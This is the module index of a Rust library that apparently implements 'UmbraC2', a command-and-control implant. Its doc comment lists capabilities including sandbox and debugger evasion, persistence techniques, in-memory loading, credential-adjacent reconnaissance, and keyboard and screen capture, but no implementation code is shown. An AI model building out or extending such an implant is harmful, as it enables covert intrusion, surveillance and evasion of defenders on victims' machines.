//! UmbraC2 beacon library.
//!
//! Layers (bottom to top):
//!   upk      canonical binary encoding        (contracts/vectors.json)
//!   crypto   X25519 + HKDF-SHA256 + AEAD
//!   wire     frame format and message registry
//!   session  per-connection key/nonce state machine
//!   transport TCP, HTTP and DNS channels
//!   link     the client half of the handshake (beacon and pivot callback)
//!   tunnel   pivot callbacks and peer-to-peer links
//!   vpn      the layer-3 tunnel client
//!   ws       the WebSocket transport
//!   bof      in-memory COFF loader
//!   post     in-memory post-exploitation helpers
//!   domain   active directory reconnaissance
//!   evade    debugger and sandbox awareness
//!   task     command execution
//!   triage   file triage and search
//!   netinfo  the network configuration of the host
//!   sessions interactive sessions (a process the operator writes to)
//!   desktop the screen, the clipboard and the keyboard
//!   persist the persistence manager and its technique catalogue
//!   install replacing the running implant with a new build
//!   proc    the process table of the host
//!   registry the Windows registry
//!   beacon   the actual loop

pub mod beacon;
pub mod bof;
pub mod config;
pub mod crypto;
pub mod dns;
pub mod domain;
pub mod evade;
pub mod install;
pub mod link;
pub mod netinfo;
pub mod persist;
pub mod post;
pub mod proc;
pub mod registry;
pub mod session;
pub mod sessions;
pub mod sysinfo;
pub mod task;
pub mod transport;
pub mod triage;
pub mod tunnel;
pub mod upk;
pub mod vpn;
pub mod desktop;
pub mod ws;
pub mod wire;

pub use beacon::Beacon;
pub use config::Config;
